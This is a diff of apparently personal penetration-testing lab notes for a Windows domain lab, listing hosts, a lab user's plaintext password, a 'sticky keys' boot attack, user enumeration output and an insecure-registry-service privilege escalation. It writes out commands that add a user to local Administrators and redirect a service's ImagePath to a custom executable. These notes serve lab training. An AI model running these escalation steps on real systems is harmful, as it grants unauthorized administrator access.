@@ -5,23 +5,20 @@ DOMAIN:
 
 192.168.56.110 - admin PC
 - NetBIOS: ADMINPC
-- DNS:
+- DNS: AdminPC
 
-192.168.56.150 - DC
+192.168.56.150 - DC - NS - Kerberos - LDAP
 - NetBIOS: CSTLABDC
-- DNS: 
+- DNS: CSTLABDC
 
 192.168.56.160 - INITIAL HOST
 - NetBIOS: CSTLABLOWPRIV
-- DNS:
+- DNS: CSTLABLOWPRIV
 
 |NetBIOS name|DNS name|Display name|Password|Privs|
 |-|-|-|-|-|
 |lowpriv?|lowpriv?|John Doe|L3tm3!n|x|
 
-# REMOTE
-
-# LOCAL
 DAY 1:
 ```
 * boot the system from an ISO, do "sticky keys" attack 
@@ -40,7 +37,7 @@ DAY 2:
 * DMT Service - ?
 ```
 
-### IS Registry Service - Insecure registery
+IS Registry Service - Insecure registry:
 ```
 Computer\HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\registrysvc
 C:\Program Files\IS Registry Service\isregsvc.exe
@@ -54,3 +51,12 @@ net localgroup Administrators user_ir /add
 reg add "Computer\HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\registrysvc" /t REG_EXPAND_SZ /v ImagePath /d "C:\Users\lowpriv.CSTLAB\Desktop\test\test.exe" /f
 ```
 
+# REMOTE
+user:[Administrator] rid:[0x1f4]
+user:[Guest] rid:[0x1f5]
+user:[krbtgt] rid:[0x1f6]
+user:[DefaultAccount] rid:[0x1f7]
+user:[lowpriv] rid:[0x450]
+user:[tomadmin] rid:[0x451]
+
+# LOCAL
